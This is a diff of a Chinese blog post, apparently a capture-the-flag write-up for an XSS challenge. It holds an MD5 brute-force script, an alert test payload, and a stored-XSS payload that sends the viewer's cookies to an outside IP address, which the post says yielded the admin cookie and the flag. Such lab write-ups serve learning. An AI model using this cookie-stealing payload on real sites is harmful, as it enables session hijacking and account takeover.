@@ -1,12 +1,67 @@
 ---
 layout: post
-title: "day3 ouc_oj"
-date:  2020-05-19 14:58:44
-description: "day3 wp"
+title: "day6 ouc_oj"
+date:  2020-05-22 14:58:44
+description: "day6 wp"
 tag: 总结
 ---
 
 ## Web-Part
+
+### day 6 BabyXSS
+
+> 这两天在写论文，所以一直没有做题...
+
+#### 题目描述：
+
+![image-20200522231507580](/images/oj_wp/image-20200522231507580.png)
+
+![image-20200522231538713](/images/oj_wp/image-20200522231538713.png)
+
+#### 解题思路：
+
+注意到最下面有个MD5验证，写脚本爆破：
+
+```python
+# -*- coding:utf-8 -*-
+import hashlib
+code = '25fdee'
+
+def MD5(str):
+    return hashlib.md5(str).hexdigest()
+    
+for i in range(0, 9999999):
+    md5 = MD5(str(i))
+    if md5[:6] == code:
+        print(i)
+        exit(0)
+```
+
+提交`<script>alert(1);</script>`测试留言板的过滤情况
+
+![image-20200522233240420](/images/oj_wp/image-20200522233240420.png)
+
+显示留言成功并在管理员查看队列中，然后访问留言，发现弹窗，查看网页源代码，留言页面没有过滤`script`标签。
+
+![image-20200522233437142](/images/oj_wp/image-20200522233437142.png)
+
+尝试构造语句获取cookie，其中地址是接收服务器的地址：
+
+```javascript
+<script>var img = document.createElement("img");
+img.src = "http://139.199.31.158/log?"+escape(document.cookie);
+document.body.appendChild(img);</script>
+```
+
+服务器接收到了admin的cookie，
+
+![C060424737C3DD81BEBD02319F001DEA](/images/oj_wp/C060424737C3DD81BEBD02319F001DEA.png)
+
+使用这个cookie访问admin.php即可获得flag
+
+![image-20200523000907465](/images/oj_wp/image-20200523000907465.png)
+
+
 
 ### day3-Basic PHP 2
 
